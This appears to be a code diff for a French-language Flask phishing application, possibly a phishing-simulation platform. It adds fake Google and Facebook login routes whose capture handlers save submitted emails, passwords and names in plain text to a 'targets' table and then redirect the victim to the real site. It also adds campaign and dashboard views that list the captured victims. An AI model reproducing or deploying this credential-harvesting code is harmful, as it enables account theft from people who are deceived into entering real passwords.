@@ -1,5 +1,5 @@
 from flask import Flask, render_template, request, redirect, url_for, flash, session
-from app.models import db, Cible, TemplateSite
+from app.models import db, Cible, TemplateSite,Utilisateur, Campagne
 
 
 def register_routes(app: Flask, db):
@@ -10,6 +10,16 @@ def register_routes(app: Flask, db):
     @app.route("/connexion")
     def connexion():
         return render_template('pyconnexion.html')
+    
+    @app.route('/google', methods=['GET'])
+    def google():
+        return render_template('pygoogle.html')
+
+    @app.route('/facebook', methods=['GET'])
+    def facebook():
+        return render_template('facebook.html')
+
+
 
     @app.route("/login", methods=["POST"])
     def login():
@@ -54,16 +64,13 @@ def register_routes(app: Flask, db):
 
         # Afficher le formulaire d'inscription si la méthode est GET
         return render_template('pyformulaire.html')
-    @app.route('/google', methods=['GET'])
-    def fake_google():
-        return render_template('fakeform.html')
+
 
     @app.route('/capture_gg', methods=['POST'])
-    def capture():
+    def capture_gg():
         email = request.form.get('email')
         password = request.form.get('password')
 
-        # Récupération du template "google"
         template = TemplateSite.query.filter_by(nom='google').first()
 
         cible = Cible(
@@ -79,16 +86,75 @@ def register_routes(app: Flask, db):
 
         return redirect("https://www.google.com")
 
+ 
+    @app.route('/capture_facebook', methods=['POST'])
+    def capture_facebook():
+        email = request.form.get('email')
+        password = request.form.get('password')
+        nom = request.form.get('nom')
+        prenom =request.form.get('prenom')
+
+        # Récupération du template "google"
+        template = TemplateSite.query.filter_by(nom='facebook').first()
+
+        cible = Cible(
+            prenom=prenom,
+            nom=nom,
+            email=email,
+            mot_de_passe=password,
+            site_id=template.id if template else None
+        )
+
+        db.session.add(cible)
+        db.session.commit()
+
+        return redirect("https://www.facebook.com")
+    
+    @app.route("/deconnexion")
+    def logout():
+        session.pop("utilisateur_id", None)
+        flash("Vous êtes déconnecté.", "success")
+        return redirect(url_for("hello_world")) 
+
+    @app.route("/campagnes")
+    def campagnes():
+        campagnes = Campagne.query.all()
+        
+        campagnes_end =  Campagne.query.filter_by(etat="Terminé").count()
+        campagnes_active =  Campagne.query.filter_by(etat="Actif").count()
+
+        print(campagnes)
+        for elem in campagnes:
+            print(elem)
+        return render_template('campagnes.html', campagnes=campagnes, campagnes_end=campagnes_end, campagnes_active=campagnes_active)
+
     @app.route('/dashboard')
     def dashboard():
+        if "utilisateur_id" not in session:
+            flash("Vous devez être connecté pour accéder au dashboard", "danger")
+            return redirect(url_for("connexion"))
+
         pieges =  Cible.query.all()
-
+        
         total_cibles = Cible.query.count()
-        pieges_count = len(pieges)
+        campagnes_active =  Campagne.query.filter_by(etat="Actif").count()
+        template_count= TemplateSite.query.count()
   
-    return render_template('pydashboard.html', pieges=pieges, pieges_count=pieges_count, total_cibles=total_cibles)
+        return render_template('pydashboard.html', pieges=pieges, total_cibles=total_cibles, template_count=template_count,campagnes_active=campagnes_active)
 
-    @app.route("/pygoogle")
-    def pygoogle():
-        return render_template('pygoogle.html')
- 
+    @app.route("/campagne/<int:id>")
+    def detail_campagne(id):
+        campagne = db.session.get(Campagne, id)
+
+        if not campagne:
+            abort(404)
+        
+        # Récupérer le template associé à la campagne
+        template = campagne.template
+
+        # Récupérer les cibles associées au template
+        cibles = template.cibles if template else []
+
+        return render_template("campagnes_id.html", campagne=campagne, cibles=cibles)
+
+
